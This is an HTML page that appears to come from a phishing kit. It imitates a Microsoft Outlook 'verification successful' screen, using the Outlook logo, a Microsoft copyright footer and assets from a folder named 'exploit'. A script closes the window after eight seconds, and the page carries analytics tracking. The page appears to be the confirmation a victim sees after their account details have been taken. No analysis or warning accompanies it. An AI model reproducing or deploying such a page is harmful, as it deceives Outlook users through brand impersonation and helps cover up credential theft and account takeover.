<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-68201809-2	', 'auto');
   
  ga('send', 'pageview');
</script>
 <SCRIPT>
setTimeout("self.close()", 8000 )
</SCRIPT>
        

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="shortcut icon" href="exploit/favicon.ico" type="image/x-icon">
<title>Outlook</title>
<link rel="stylesheet" type="text/css" href="exploit/style2.css">
</head>
<body dir="ltr" class="ltr normal en-in">
<div id="confirm">
<div id="brand" class="newmail">
<a href="#">
<img src="exploit/Outlook_Logo_140x40_ltr.png">
</a>
</div>
<table>
<td>
<h2>VERIFICATION SUCCESSFUL...<br>
<br>Your account verification information has been updated.</h2>
</td>
</table>
</div>
<div id="mboxDefault" class="mboxDefault" style="visibility: visible; display: block;">
<div id="offer">
<img src="exploit/big-feedback_ltr.png" alt="Let us hear it">
</div>
</div>
</div><div id="mboxMarker-default-PROD-outlook_signout-0" style="visibility:hidden;display:none">&nbsp;</div>
<div id="footer"><span id="ftrCopy">©2018 Microsoft</span><a href="#" id="ftrTerms">Terms</a><a href="#" id="ftrPrivacy">Privacy &amp; cookies</a></div>
</body>
</html>